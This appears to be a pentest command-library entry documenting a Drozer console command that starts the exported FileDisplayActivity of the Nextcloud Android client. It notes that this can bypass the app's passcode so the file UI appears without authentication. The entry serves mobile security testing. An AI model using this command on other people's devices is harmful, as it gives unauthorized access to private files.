---
data: >-
  run app.activity.start --component com.nextcloud.client
  com.owncloud.android.ui.activity.FileDisplayActivity
tags:
  - drozer
  - exploit
  - activity
type: command
output: null
executor: bash
platforms:
  - Android
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:24:39.862Z'
id: 7c0c3c27-bda3-4f42-a237-2a2ccb8e3d6d
verified: false
validated: true
submitted: true
---
# run-app-activity-start

## Command

```bash
run app.activity.start --component com.nextcloud.client com.owncloud.android.ui.activity.FileDisplayActivity
```

## Description

Executed within the Drozer console, this command starts a specified Android activity by sending an intent to the target component, useful for testing exported activities and bypassing app protections like passcodes.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `--component` | Specifies the package and activity class (e.g., package.class) | Yes |
| `--action` | Optional intent action (default: android.intent.action.MAIN) | No |

## Examples

### Basic Usage

```bash
run app.activity.start --component com.nextcloud.client com.owncloud.android.ui.activity.FileDisplayActivity
```

### Advanced Usage

With extra data: `run app.activity.start --component com.example.app com.example.MainActivity --extras "key=value"`

## Expected Output

Activity launches on device; console may show 'Activity started successfully' or intent details. In exploitation, the UI appears without auth.

## Related

- [[Related Procedure: Exploit-Exported-FileDisplayActivity]]
